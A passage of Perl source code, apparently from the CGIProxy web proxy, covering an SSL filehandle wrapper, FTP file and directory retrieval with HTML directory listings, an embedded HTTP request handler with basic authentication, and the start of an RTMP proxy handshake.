	    Net::SSLeay::CTX_use_certificate_file($SSL_CONTEXT, File::Spec->catfile($main::PROXY_DIR, $main::CERTIFICATE_FILE), &Net::SSLeay::FILETYPE_PEM)
		or Net::SSLeay::die_if_ssl_error("error with certificate: $!") ;
	}
    }


    # For the print() function.  Respect $, and $\ settings.
    sub PRINT {
	my($self)= shift ;
	my($written, $errs)=
	    Net::SSLeay::ssl_write_all($self->{SSL}, join($, , @_) . $\ ) ;
	# jsm-- following line generates OpenSSL warnings... need to debug.
#	die "Net::SSLeay::ssl_write_all error: $errs"  if $errs ne '' ;
	return 1 ;   # to keep consistent with standard print()
    }

    sub READ {
	my($self)= shift ;
	return 0 if $self->{eof} ;

	# Can't use my(undef) in some old versions of Perl, so use $dummy.
	my($dummy, $len, $offset)= @_ ;   # $_[0] is handled explicitly below
	my($read, $errs) ;

	# this could be cleaned up....
	if ($len > length($self->{buf})) {
	    if ( $offset || ($self->{buf} ne '') ) {
		$len-= length($self->{buf}) ;
		#$read= Net::SSLeay::ssl_read_all($self->{SSL}, $len) ;
		($read, $errs)= &ssl_read_all_fixed($self->{SSL}, $len) ;
		&main::HTMLdie(["ssl_read_all_fixed() error: %s", $errs]) if $errs ne '' ;
		return undef unless defined($read) ;
		$self->{eof}= 1  if length($read) < $len ;
		my($buflen)= length($_[0]) ;
		$_[0].= "\0" x ($offset-$buflen)  if $offset>$buflen ;
		substr($_[0], $offset)= $self->{buf} . $read ;
		$self->{buf}= '' ;
		return length($_[0])-$offset ;
	    } else {
		# Streamlined block for the most common case.
		#$_[0]= Net::SSLeay::ssl_read_all($self->{SSL}, $len) ;
		($_[0], $errs)= &ssl_read_all_fixed($self->{SSL}, $len) ;
		&main::HTMLdie(["ssl_read_all_fixed() error: %s", $errs]) if $errs ne '' ;
		return undef unless defined($_[0]) ;
		$self->{eof}= 1  if length($_[0]) < $len ;
		return length($_[0]) ;
	    }
	} else {
	    # Here the ?: operator returns an lvar.
	    ($offset  ? substr($_[0], $offset)  : $_[0])=
		substr($self->{buf}, 0, $len) ;
	    substr($self->{buf}, 0, $len)= '' ;
	    return $len ;
	}
    }


    sub READLINE {
	my($self)= shift ;
	my($read, $errs) ;
	if (defined($/)) {
	    if (wantarray) {
		return () if $self->{eof} ;
		($read, $errs)= &ssl_read_all_fixed($self->{SSL}) ;
		&main::HTMLdie(["ssl_read_all_fixed() error: %s", $errs]) if $errs ne '' ;
		# Prepend current buffer, and split to end items on $/ or EOS;
		#   this regex prevents final '' element.
		$self->{eof}= 1 ;
		return ($self->{buf} . $read)=~ m#(.*?\Q$/\E|.+?\Z(?!\n))#sg ;
	    } else {
		return '' if $self->{eof} ;
		my($pos, $read, $ret) ;
		while ( ($pos= index($self->{buf}, $/)) == -1 ) {
		    $read= Net::SSLeay::read($self->{SSL}, $self->{readsize} || 1 ) ;
		    #return undef if $errs = Net::SSLeay::print_errs('SSL_read') ;
		    &main::HTMLdie(['Net::SSLeay::read error: %s', $errs])
			if $errs= Net::SSLeay::print_errs('SSL_read') ;
		    $self->{eof}= 1, return $self->{buf}  if $read eq '' ;
		    $self->{buf}.= $read ;
		}
		$pos+= length($/) ;
		$ret= substr($self->{buf}, 0, $pos) ;
		substr($self->{buf}, 0, $pos)= '' ;
		return $ret ;
	    }
	} else {
	    return '' if $self->{eof} ;
	    ($read, $errs)= &ssl_read_all_fixed($self->{SSL}) ;
	    &main::HTMLdie(['ssl_read_all_fixed() error: %s', $errs]) if $errs ne '' ;
	    $self->{eof}= 1 ;
	    return  $self->{buf} . $read ;
	}
    }


    # Used when closing socket, or from UNTIE() or DESTROY() if needed.
    #   Calling Net::SSLeay::free() twice on the same object causes a crash,
    #   so be careful not to do that.
    sub CLOSE {
	my($self)= shift ;
	my($errs) ;
	$self->{eof}= 1 ;
	$self->{buf}= '' ;
	if (defined($self->{SSL})) {
	    Net::SSLeay::free($self->{SSL}) ;
	    delete($self->{SSL}) ;  # to detect later if we've free'd it or not
	    &main::HTMLdie(['Net::SSLeay::free error: %s', $errs])
		if $errs= Net::SSLeay::print_errs('SSL_free') ;
	    close($self->{socket}) ;
	}
    }

    sub UNTIE {
	my($self)= shift ;
	$self->CLOSE ;
    }
    sub DESTROY {
	my($self)= shift ;
	$self->CLOSE ;
    }

    sub FILENO {
	my($self)= shift ;
	return fileno($self->{socket}) ;
    }

    sub EOF {
	my($self)= shift ;
	return 1 if $self->{eof} ;        # overrides anything left in {buf}
	return 0 if $self->{buf} ne '' ;
	return eof($self->{socket}) ;
    }


    # BINMODE we define to be the same as binmode() on the underlying socket.
    # Only ever relevant on non-Unix machines.
    sub BINMODE {
	my($self)= shift ;
	binmode($self->{socket}) ;
    }


    # In older versions of Net::SSLeay, there was a bug in ssl_read_all()
    #   and ssl_read_until() where pages were truncated on any "0" character.
    #   To work with those versions, here we use a fixed copy of ssl_read_all().
    #   Earlier versions of CGIProxy had older copies of the two routines but
    #   fixed; now we just copy ssl_read_all() in from the new Net::SSLeay
    #   module and tweak it as needed.  (ssl_read_until() is no longer needed
    #   now that this package uses an input buffer.)

    sub ssl_read_all_fixed {
	my ($ssl,$how_much) = @_;
	$how_much = 2000000000 unless $how_much;
	my ($got, $errs);
	my $reply = '';

	while ($how_much > 0) {
	    # read($ssl, 2000000000) would eat up memory.
	    $got = Net::SSLeay::read($ssl, ($how_much>32768) ? 32768 : $how_much);
	    last if $errs = Net::SSLeay::print_errs('SSL_read');
	    $how_much -= Net::SSLeay::blength($got);
	    last if $got eq '';  # EOF
	    $reply .= $got;
	}
	return wantarray ? ($reply, $errs) : $reply;
    }


    # end of package SSL_Handle
}




# ftp_get:

sub ftp_get {
    my($is_dir, $rcode, @r, $dataport, $remote_addr,
       $ext, $content_type, %content_type, $content_length, $enc_URL,
       @welcome, @cwdmsg) ;
    local($/)= "\012" ;

    $port= 21 if $port eq '' ;

    # List of file extensions and associated MIME types, or at least the ones
    #   a typical browser distinguishes from a nondescript file.
    # I'm open to suggestions for improving this.  One option is to read the
    #   file mime.types if it's available.
    %content_type=
	  ('txt',  'text/plain',
	   'text', 'text/plain',
	   'htm',  'text/html',
	   'html', 'text/html',
	   'css',  'text/css',
	   'png',  'image/png',
	   'jpg',  'image/jpeg',
	   'jpeg', 'image/jpeg',
	   'jpe',  'image/jpeg',
	   'gif',  'image/gif',
	   'xbm',  'image/x-bitmap',
	   'mpg',  'video/mpeg',
	   'mpeg', 'video/mpeg',
	   'mpe',  'video/mpeg',
	   'qt',   'video/quicktime',
	   'mov',  'video/quicktime',
	   'aiff', 'audio/aiff',
	   'aif',  'audio/aiff',
	   'au',   'audio/basic',
	   'snd',  'audio/basic',
	   'wav',  'audio/x-wav',
	   'mp2',  'audio/x-mpeg',
	   'mp3',  'audio/mpeg',
	   'ram',  'audio/x-pn-realaudio',
	   'rm',   'audio/x-pn-realaudio',
	   'ra',   'audio/x-pn-realaudio',
	   'gz',   'application/x-gzip',
	   'zip',  'application/zip',
	   ) ;


    $is_dir= $path=~ m#/$# ;
    $is_html= 0 if $is_dir ;   # for our purposes, do not treat dirs as HTML

    # Set $content_type based on file extension.
    # Hmm, still unsure how best to handle unknown file types.  This labels
    #   them as text/plain, so that README's, etc. will display right.
    ($ext)= $path=~ /\.(\w+)$/ ;  # works for FTP, not for URLs with query etc.
    $content_type= ($is_html || $is_dir)  ? 'text/html; charset=utf-8'
					  : $content_type{lc($ext)}
					    || 'text/plain' ;


    # If we're removing scripts, then disallow script MIME types.
    if ($content_type=~ /^$SCRIPT_TYPE_REGEX$/io) {
	&script_content_die  if $scripts_are_banned_here ;
	&script_content_die  if !match_csp_source_list('script-src', $URL) ;
    }


    # Hack to help handle spaces in pathnames.  :P
    # $path should be delivered to us here with spaces encoded as "%20".
    #   But that's not what the FTP server wants (or what we should display),
    #   so translate them back to spaces in a temporary copy of $path.
    #   Hopefully the FTP server will allow spaces in the FTP commands below,
    #   like "CWD path with spaces".
    local($path)= $path ;
    $path=~ s/%20/ /g ;


    # Create $status and $headers, and leave $body and $is_html as is.
    # Directories use an HTML response, though $is_html is false when $is_dir.
    $status= "$HTTP_1_X 200 OK\015\012" ;
    $headers= $session_cookies . $NO_CACHE_HEADERS . "Date: " . &rfc1123_date($now,0) . "\015\012"
	. ($content_type  ? "Content-Type: $content_type\015\012"  : '') . "\015\012" ;


    # Open the control connection to the FTP server
    &newsocketto('S', $host, $port) ;
    binmode S ;   # see note with "binmode STDOUT", above

    # Luckily, RFC 959 (FTP) has a really good list of all possible response
    #   codes to all possible commands, on pages 50-53.

    # Connection establishment
    ($rcode)= &ftp_command('', '120|220') ;
    &ftp_command('', '220') if $rcode==120 ;

    # Login
    ($rcode, @welcome)= &ftp_command("USER $username\015\012", '230|331') ;
    ($rcode, @welcome)= &ftp_command("PASS $password\015\012", '230|202')
	if $rcode==331 ;

    # Set transfer parameters
    &ftp_command("TYPE I\015\012", '200') ;


    # Socket module before 1.94 doesn't support IPv6.
    if ($Socket::VERSION>=1.94) {
	# If using passive FTP, send PASV or EPSV command and parse response.
	if ($USE_PASSIVE_FTP_MODE) {
	    my($err, $addr)= getaddrinfo($host, $port, { socktype => SOCK_STREAM }) ;
	    if ($addr->{family}==AF_INET6()) {
		($rcode, @r)= &ftp_command("EPSV\015\012", '229') ;
		my(undef, $dataport)= (join('',@r))=~ /^[^\(]*\((.)\1\1(\d+)\1\)/ ;
	    } elsif ($addr->{family}==AF_INET) {
		my(@p) ;
		($rcode, @r)= &ftp_command("PASV\015\012", '227') ;
		# RFC 959 isn't clear on the response format, but here we assume that the
		#   first six integers separated by commas are the host and port.
		@p= (join('',@r))=~ /(\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+)/ ;
		$dataport= ($p[4]<<8) + $p[5] ;
	    } else {
		&HTMLdie(["Address family %s not supported with FTP.", $addr->{family}]) ;
	    }

	    # Open the data socket to $dataport.  This is conceptually paired
	    #   with the accept() for non-passive mode below, but we have to
	    #   open the socket here first to allow for 125/150 responses to
	    #   LIST and RETR commands in passive mode.
	    &newsocketto('DATA_XFER', $host, $dataport) ;
	    binmode DATA_XFER ;   # see note with "binmode STDOUT", above

	# If not using passive FTP, listen on open port and send PORT or EPRT command.
	# See notes by newsocketto() about replacing pack('S n a4 x8') usage.
	} else {
	    my($err, $addr)= getaddrinfo(undef, $port, { flags => AI_PASSIVE(), socktype => SOCK_STREAM }) ;
	    # Create and listen on data socket
	    socket(DATA_LISTEN, $addr->{family}, SOCK_STREAM, scalar getprotobyname('tcp'))
		|| &HTMLdie(["Couldn't create FTP data socket: %s", $!]) ;
#	    bind(DATA_LISTEN, pack('S n a4 x8', AF_INET, 0, "\0\0\0\0") )
	    bind(DATA_LISTEN, $addr)
		|| &HTMLdie(["Couldn't bind FTP data socket: %s", $!]) ;
	    listen(DATA_LISTEN,1)
		|| &HTMLdie(["Couldn't listen on FTP data socket: %s", $!]) ;
	    select((select(DATA_LISTEN), $|=1)[0]) ;    # unbuffer the socket

	    # Tell FTP server which port to connect to
	    if ($addr->{family}==AF_INET6()) {
		my($err, $num_addr, $num_port)= getnameinfo($addr->{addr}, NI_NUMERICHOST()|NI_NUMERICSERV()) ;
		&ftp_command( sprintf("EPRT |%s|%s|%s|\015\012", $addr->{family}, $num_addr, $num_port), '200') ;
	    } elsif ($addr->{family}==AF_INET) {
#	    $dataport= (unpack('S n a4 x8', getsockname(DATA_LISTEN)))[1] ;
		$dataport= (unpack_sockaddr_in(getsockname(DATA_LISTEN)))[0] ;
		&ftp_command(sprintf("PORT %d,%d,%d,%d,%d,%d\015\012",
				     unpack('C4', substr(getsockname(S),4,4)),
				     $dataport>>8, $dataport & 255),
			     '200') ;
	    } else {
		&HTMLdie(["Address family %s not supported with FTP.", $addr->{family}]) ;
	    }
	}


    # IPv4 only.
    } else {
	# If using passive FTP, send PASV command and parse response.
	if ($USE_PASSIVE_FTP_MODE) {
	    my(@p) ;
	    ($rcode, @r)= &ftp_command("PASV\015\012", '227') ;
	    # RFC 959 isn't clear on the response format, but here we assume that the
	    #   first six integers separated by commas are the host and port.
	    @p= (join('',@r))=~ /(\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*(\d+)/ ;
	    $dataport= ($p[4]<<8) + $p[5] ;

	    # Open the data socket to $dataport.  This is conceptually paired
	    #   with the accept() for non-passive mode below, but we have to
	    #   open the socket here first to allow for 125/150 responses to
	    #   LIST and RETR commands in passive mode.
	    &newsocketto('DATA_XFER', $host, $dataport) ;
	    binmode DATA_XFER ;   # see note with "binmode STDOUT", above

	# If not using passive FTP, listen on open port and send PORT or command.
	# See notes by newsocketto() about replacing pack('S n a4 x8') usage.
	} else {
	    # Create and listen on data socket
	    socket(DATA_LISTEN, AF_INET, SOCK_STREAM, scalar getprotobyname('tcp'))
		or &HTMLdie(["Can't create FTP data socket: %s", $!]) ;
	    bind(DATA_LISTEN, pack_sockaddr_in($port, INADDR_ANY))
		or &HTMLdie("Can't bind FTP data socket: $!") ;
	    listen(DATA_LISTEN, 1)
		or &HTMLdie("Can't listen on FTP data socket: $!") ;
	    select((select(DATA_LISTEN), $|=1)[0]) ;    # unbuffer the socket

	    $dataport= (unpack_sockaddr_in(getsockname(DATA_LISTEN)))[0] ;
	    &ftp_command(sprintf("PORT %d,%d,%d,%d,%d,%d\015\012",
				 unpack('C4', substr(getsockname(S),4,4)),
				 $dataport>>8, $dataport & 255),
			 '200') ;
	}
    }


    # Do LIST for directories, RETR for files.
    # Unfortunately, the FTP spec in RFC 959 doesn't define a standard format
    #   for the response to LIST, but most servers use the equivalent of
    #   Unix's "ls -l".  Response to the NLST command is designed to be
    #   machine-readable, but it has nothing but file names.  So we use
    #   LIST and parse it as best we can later.
    if ($is_dir) {
	# If we don't CWD first, then symbolic links won't be followed.
	($rcode, @cwdmsg)= &ftp_command("CWD $path\015\012", '250') ;
	($rcode, @r)= &ftp_command("LIST\015\012", '125|150') ;
# was:  ($rcode, @r)= &ftp_command("LIST $path\015\012", '125|150') ;

    } else {
	($rcode, @r)= &ftp_command("RETR $path\015\012", '125|150|550') ;

	# If 550 response, it may be a symlink to a directory.
	# Try to CWD to it; if successful, do a redirect, else die with the
	#   original error response.  Note that CWD is required by RFC 1123
	#   (section 4.1.2.13), which updates RFC 959.
	if ($rcode==550) {
	    ($rcode)= &ftp_command("CWD $path\015\012", '') ;
	    &ftp_error(550,@r) unless $rcode==250 ;

	    ($enc_URL= $URL)=~ s/ /%20/g ;  # URL-encode any spaces

	    # Redirect the browser to the same URL with a trailing slash
	    print $STDOUT "$HTTP_1_X 301 Moved Permanently\015\012",
			  $session_cookies, $NO_CACHE_HEADERS,
			  "Date: ", &rfc1123_date($now,0), "\015\012",
			  "Location: ", $url_start, &wrap_proxy_encode($enc_URL . '/'),
			  "\015\012\015\012" ;
	    close(S) ; close(DATA_LISTEN) ; close(DATA_XFER) ;
	    goto ONE_RUN_EXIT ;
	}
    }


    # If not using passive FTP, accept the connection.
    if (!$USE_PASSIVE_FTP_MODE) {
	($remote_addr= accept(DATA_XFER, DATA_LISTEN))
	    || &HTMLdie(['Error accepting FTP data socket: %s', $!]) ;
	select((select(DATA_XFER), $|=1)[0]) ;      # unbuffer the socket
	close(DATA_LISTEN) ;
	&HTMLdie("Intruder Alert!  Someone other than the server is trying to send you data.")
	    unless (substr($remote_addr,4,4) eq substr(getpeername(S),4,4)) ;
    }


    # Read the data into $body.
    # Streaming support added in 1.3.  For notes about streaming, look near
    #   the end of the http_get() routine.  Basically, as long as a resource
    #   isn't HTML (or a directory listing, in the case of FTP), we can pass
    #   the data immediately to the client, since it won't be modified.

    # This first block is for the rare case when an FTP resource is a special
    #   type that needs to be converted, e.g. a style sheet.  The block is
    #   copied in from http_get() and modified.  It will be cleaner and
    #   handled differently in a future version.

    if ( !$is_dir && !$is_html &&
	 (    ($expected_type=~ /^$TYPES_TO_HANDLE_REGEX$/io)
	   || ($content_type=~  /^$TYPES_TO_HANDLE_REGEX$/io)   ) ) {

	my($type) ;
	if ($expected_type=~ /^$TYPES_TO_HANDLE_REGEX$/io) {
	    $type= $expected_type ;
	} else {
	    $type= $content_type ;
	}

	undef $/ ;
	$body= <DATA_XFER> ;

	$body= (&proxify_block($body, $type))[0] ;

	$headers= "Content-Length: " . length($body) . "\015\012" . $headers ;

	print $STDOUT $status, $headers, $body ;


    } elsif ($is_html or $is_dir) {
	undef $/ ;
	$body= <DATA_XFER> ;

	$body= &proxify_html(\$body, 1)  if $is_html ;

	# Quick check for "<meta charset=...>" in $body, and decode if it's there.
	if ($body=~ /^.{0,1024}?<\s*meta[^>]+\bcharset\s*=['"]?([^'"\s>]+)/si) {
	    $meta_charset= $1 ;
	    eval { $body= decode($meta_charset, $body) } ;
	    &malformed_unicode_die($meta_charset) if $@ ;
	}

	# Make a user-friendly directory listing.
	&ftp_dirfix(\@welcome, \@cwdmsg)  if $is_dir ;

	# Must change to byte string before compressing or sending.
	eval { $body= encode('UTF-8', $body) } ;
	&malformed_unicode_die('UTF-8') if $@ ;
	$headers=~ s/^(Content-Type:[^\015\012;]*)[^\015\012]*/$1; charset=UTF-8/gmi ;

	# gzip the response body if we're allowed and able.
	&gzip_body  if $ENV{HTTP_ACCEPT_ENCODING}=~ /\bgzip\b/i ;

	# Change Content-Length header, since we changed the content
	$headers=~ s/^Content-Length:.*\012/'Content-Length: ' . length($body) . "\015\012"/mie ;

	print $STDOUT $status, $headers, $body ;


    } else {
	# Stick a Content-Length: header into the headers if appropriate (often
	#   there's a "(xxx bytes)" string in a 125 or 150 response line).
	# Be careful about respecting previous value of $headers, which may
	#   already end in a blank line.
	foreach (grep(/^(125|150)/, @r)) {
	    if ( ($content_length)= /\((\d+)[ \t]+bytes\)/ ) {
		$headers= "Content-Length: $content_length\015\012" . $headers ;
		last ;
	    }
	}

	# This is the primary change to support streaming media.
	my($buf) ;
	print $STDOUT $status, $headers ;
	print $STDOUT $buf while read(DATA_XFER, $buf, 16384) ;
    }


    close(DATA_XFER) ;

    # Get the final completion response
    &ftp_command('', '226|250') ;

    &ftp_command("QUIT\015\012") ;   # don't care how they answer

    close(S) ;

}  # sub ftp_get()



# Send $cmd and return response code followed by full lines of  FTP response.
# Die if response doesn't match the regex $ok_response.
# Assumes the FTP control connection is in socket S.
sub ftp_command {
    my($cmd, $ok_response)= @_ ;
    my(@r, $rcode) ;
    local($/)= "\012" ;

    print S $cmd ;

    $_= $r[0]= <S> ;
    $rcode= substr($r[0],0,3) ;
    until (/^$rcode /) {      # this catches single- and multi-line responses
	push(@r, $_=<S>) ;
    }

    &ftp_error($rcode,@r) if $ok_response ne '' && $rcode!~ /$ok_response/ ;
    return $rcode, @r ;
}


# Convert a directory listing to user-friendly HTML.
# The text in $body is the output of the FTP LIST command, which is *usually*
#   the equivalent of Unix's "ls -l" command.  See notes in ftp_get() about
#   why we use LIST instead of NLST.
# A couple of tangles here to handle spaces in filenames.  We should probably
#   handle spaces in other protocols too, but URLs normally prohibit spaces--
#   it's only relative paths within a scheme (like FTP) that would have them.
sub ftp_dirfix {
    my($welcome_ref, $cwdmsg_ref)= @_ ;
    my($newbody, $parent_link, $max_namelen,
       @f, $is_dir, $is_link, $link, $name, $size, $size_type, $file_type,
       $welcome, $cwdmsg, $insertion, $enc_path) ;

    # Set minimum name column width; longer names will widen the column
    $max_namelen= 16 ;

    # each file should have name/, size, date
    my(@body)= split(/\015?\012/, $body) ;
    foreach (@body) {
	# Hack to handle leading spaces in filenames-- only allow a single
	#   space after the 8th field before filename starts.
#	@f= split(" ", $_, 9) ;   # Note special use of " " pattern.
#	next unless $#f>=8 ;
	@f= split(" ", $_, 8) ;   # Note special use of " " pattern.
	next unless $#f>=7 ;
	@f[7,8]= $f[7]=~ /^(\S*) (.*)/ ;  # handle leading spaces in filenames

	next if $f[8]=~ /^\.\.?$/ ;
	$file_type= '' ;
	$is_dir=  $f[0]=~ /^d/i ;
	$is_link= $f[0]=~ /^l/i ;
	$file_type= $is_dir     ? 'Directory'
		  : $is_link    ? 'Symbolic link'
		  :               '' ;
	$name= $f[8] ;
	$name=~ s/^(.*) ->.*$/$1/ if $is_link ;   # remove symlink's " -> xxx"
	$name.= '/' if $is_dir ;
	$max_namelen= length($name) if length($name)>$max_namelen ;
	if ($is_dir || $is_link) {
	    ($size, $size_type)= () ;
	} else {
	    ($size, $size_type)= ($f[4], 'bytes') ;
	    ($size, $size_type)= ($size>>10, 'Kb') if $size > 10240 ;
	}

	# Easy absolute URL calculation, because we know it's a relative path.
	($enc_path= $base_path . $name)=~ s/ /%20/g ;  # URL-encode any spaces
	$link=  &HTMLescape( $url_start . &wrap_proxy_encode($enc_path) ) ;

	$newbody.=
	    sprintf("  <a href=\"%s\">%s</a>%s %5s %-5s %3s %2s %5s  %s\012",
			   $link, $name, "\0".length($name),
			   $size, $size_type,
			   @f[5..7],
			   $file_type) ;
    }

    # A little hack to get filenames to line up right-- replace embedded
    #  "\0"-plus-length with correct number of spaces.
    $newbody=~ s/\0(\d+)/ ' ' x ($max_namelen-$1) /ge ;

    if ($path eq '/') {
	$parent_link= '' ;
    } else {
	($enc_path= $base_path)=~ s#[^/]*/$## ;
	$enc_path=~ s/ /%20/g ;  # URL-encode any spaces
	$link=  &HTMLescape( $url_start . &wrap_proxy_encode($enc_path) ) ;
	$parent_link= "<a href=\"$link\">Up to higher level directory</a>" ;
    }

    if ($SHOW_FTP_WELCOME && $welcome_ref) {
	$welcome= &HTMLescape(join('', grep(s/^230-//, @$welcome_ref))) ;
	# Make links of any URLs in $welcome.  Imperfect regex, but does OK.
	$welcome=~ s#\b([\w+.-]+://[^\s"']+[\w/])(\W)#
	    '<a href="' . &full_url($1) . "\">$1</a>$2" #ge ;
	$welcome.= "<hr>" if $welcome ne '' ;
    } else {
	$welcome= '' ;
    }

    # If CWD returned a message about this directory, display it.  Make links
    #   a la $welcome, above.
    if ($cwdmsg_ref) {
	$cwdmsg= &HTMLescape(join('', grep(s/^250-//, @$cwdmsg_ref))) ;
	$cwdmsg=~ s#\b([\w+.-]+://[^\s"']+[\w/])(\W)#
	    '<a href="' . &full_url($1) . "\">$1</a>$2" #ge ;
	$cwdmsg.= "<hr>" if $cwdmsg ne '' ;
    }


    # Create the top insertion if needed.
    $insertion= &full_insertion($URL,0)  if $doing_insert_here ;


    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOD  : $MSG{$lang}{'ftp_dirfix.response'} ;

EOD
    $body= sprintf($response, $dir, $URL, $insertion, $host, $path,
		   $welcome, $cwdmsg, $parent_link, $newbody) ;

}


# Return a generalized FTP error page.
# For now, respond with 200.  In the future, give more appropriate codes.
sub ftp_error {
    my($rcode,@r)= @_ ;

    close(S) ; close(DATA_LISTEN) ; close(DATA_XFER) ;

    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOR  : $MSG{$lang}{'ftp_error.response'} ;

EOR
    $response= sprintf($response, $dir, $host) . join('', @r, "</pre>\n") . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOR . $response;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOR

    goto ONE_RUN_EXIT ;
}



sub handle_http_request {
    my($SS, $listen_port, $apply_ssl, $out_fh, $read_address)= @_ ;

    # Exit when the socket is closed on the other end.
    $SIG{PIPE}= sub { exit(1) } ;

    if ($apply_ssl) {
	my $ssl_obj= tie(*SSL2CLIENT, 'SSL_Handle', \*$SS, 1) ;

	# Rewire STDIN and STDOUT to be SSL2CLIENT .
	# Oddly, after doing this, reading from STDIN gives encrypted characters,
	#   but reading from SSL2CLIENT gives correct characters.
	# Easier to just use $STDIN.
	#close(STDIN) ;
	#open(STDIN, '+<&', \*SSL2CLIENT)  or die "rewire STDIN failed: $!\n" ;
	$STDIN= \*SSL2CLIENT ;

	# Next two lines die with a "scalar.xs:50: PerlIOScalar_pushed: Assertion ... failed"
	#   error.
	#close(STDOUT) ;
	#open(STDOUT, '+>&', \*SSL2CLIENT)  or die "rewire STDOUT failed: $!\n" ;
	$STDOUT= \*SSL2CLIENT ;

	# Accept SSL connection.
	#Net::SSLeay::accept($ssl_obj->{SSL}) or Net::SSLeay::die_if_ssl_error("SSL accept() error: $!");
#$Net::SSLeay::trace= 1 ;
	my $rv ;
	while (1) {
	    # jsm-- busy loop here-- fix.
	    $rv= Net::SSLeay::accept($ssl_obj->{SSL}) ;
	    last if $rv>0 ;
	    my $err= Net::SSLeay::get_error($ssl_obj->{SSL}, $rv) ;
	    next if $err==Net::SSLeay::ERROR_WANT_READ() or $err==Net::SSLeay::ERROR_WANT_WRITE() ;
	    return if $rv==0 and $err==Net::SSLeay::ERROR_SYSCALL() ;  # EOF that violates protocol
	    die "Net::SSLeay::accept() failed; err=[$err]\n" ;
	}

	# SSL connection is now set up.

    # Else we're using unencrypted pipes.
    } else {
	$STDIN= $SS ;
	$STDOUT= $out_fh || $SS ;
    }


    my $peer= getpeername($SS) ;
    my($err, $remote_address)= getnameinfo($peer, NI_NUMERICHOST(), NIx_NOSERV()) ;

    local($/)= "\012" ;

    # Support HTTP/1.1 pipelining.
    while (1) {
	my $request_line= <$STDIN> ;
	return unless defined $request_line ;

	# If line starts with a digit, it's the remote IP address.
	# A valid HTTP request line doesn't start with a digit.
	# (This mechanism is currently unused.)
	chomp($remote_address= $request_line), next  if $request_line=~ /^\d/ ;

	my($method, $request_uri, $client_http_version)=
	    $request_line=~ /^(\w+)\s+(.*)\s+(HTTP\/[\d.]+)\015?\012\z/s ;

	$request_uri=~ s#(?:^[\w+.-]+:)?//(?:[^/]*)## ;    # strip leading scheme and host:port if there


	# Read headers into @headers .
	my($header, @headers) ;
	while (($header= <$STDIN>)!~ /^\015?\012\z/) {
	    $header=~ s/\015?\012\z// ;    # remove trailing CRLF
	    last unless $header ne '' ;
	    # Unfold long headers as needed.
	    if ($header=~ s/^\s+/ / and @headers) {
		$headers[$#headers].= $header ;
	    } else {
		push(@headers, $header) ;
	    }
	}

	# For now, don't return any favicon.ico .
	if ($request_uri eq '/favicon.ico') {
	    my($date_header)= &rfc1123_date($now, 0) ;
	    print $STDOUT "HTTP/1.1 404 Not Found\015\012Date: $date_header\015\012\015\012" ;
	    next ;
	}


	# Set %ENV .
	%ENV= %ENV_UNCHANGING ;
	my($name, $value) ;
	foreach (@headers) {
	    ($name, $value)= split(/:\s*/, $_, 2) ;
	    $name=~ s/-/_/g ;
	    $ENV{'HTTP_' . uc($name)}= $value ;
	}
	foreach (qw(CONTENT_LENGTH CONTENT_TYPE)) {
	    $ENV{$_}= $ENV{"HTTP_$_"} ;
	    delete $ENV{"HTTP_$_"} ;
	}
	my $auth= $ENV{HTTP_AUTHORIZATION} ;
	delete $ENV{HTTP_AUTHORIZATION} ;

	# Set AUTH_TYPE, and authenticate!
	my($up64, $u, $p) ;
	if ($auth) {
	    ($ENV{AUTH_TYPE}, $up64)= split(/\s+/, $auth) ;
	    ($u, $p)= split(/:/, unbase64($up64))  if defined $up64 ;
	} else {
	    $ENV{AUTH_TYPE}= '' ;
	}
	return_401_response($client_http_version), last  unless &daemon_authenticate($ENV{AUTH_TYPE}, $u, $p) ;

	$ENV{PATH_INFO}= $request_uri ;
	# Skip PATH_TRANSLATED; it's messy and we don't use it.
	$ENV{REMOTE_ADDR}= $remote_address ;
	# Skip REMOTE_HOST; it's expensive and we don't use it.
	$ENV{REMOTE_USER}= $u ;
	$ENV{REQUEST_METHOD}= $method ;
	$ENV{SERVER_PROTOCOL}= $client_http_version ;


	# Run it!
	eval { one_run() } ;
	if ($@=~ /^exiting\b/) {
	    close(S) ;
	    untie(*S) ;
	    eval { alarm(0) } ;   # use eval{} to avoid failing where alarm() is missing
	    last ;
	}


	# Return if not pipelining.
	last if $ENV{HTTP_CONNECTION} eq 'close' ;
    }

    return 1 ;
}


# These are the CGI environment variables that don't change from run to run.
sub set_ENV_UNCHANGING {
    my($port)= @_ ;

    $ENV_UNCHANGING{GATEWAY_INTERFACE}= 'CGI/1.1' ;
    ($ENV_UNCHANGING{SERVER_NAME}= hostfqdn()) =~ s/\.$// ;   # bug in hostfqdn() may leave trailing dot
    $ENV_UNCHANGING{SERVER_PORT}= $port ;
    $ENV_UNCHANGING{SERVER_SOFTWARE}= 'Embedded' ;

    $ENV_UNCHANGING{QUERY_STRING}= '' ;    # it's in PATH_INFO instead.
    $ENV_UNCHANGING{SCRIPT_NAME}= '' ;
}


# Very simple for now, but may be expanded later.
sub daemon_authenticate {
    my($authtype, $u, $p)= @_ ;
    return 1 unless $EMB_USERNAME ne '' or $EMB_PASSWORD ne '' ;
    return ($u eq $EMB_USERNAME and $p eq $EMB_PASSWORD) ;
}


sub rtmp_proxy {
    my($SS, $listen_port)= @_ ;
    $RTMP_SERVER_PORT= $listen_port ;   # hacky...

    # First, do the handshake with the client.
    
    # Store our epoch.
    my $t0_SS= [gettimeofday] ;
    my $t0_SC ;

    # Read C0 (RTMP version).
    my $c0= read_socket($SS, 1) ;

    # Send S0.
    print $SS "\x03" ;

    # Read C1 (timestamp, zero, and 1528 random bytes).
    my $c1= read_socket($SS, 1536) ;
    my $c1_read_t= int(tv_interval($t0_SS)*1000) ;    # in milliseconds
    my $client_t0= unpack('N', substr($c1, 0, 4)) ;
    my $remote1528= substr($c1, 8) ;

    # Send S1.
    my $local1528= join('', map {chr(int(rand 256))} 1..1528) ;
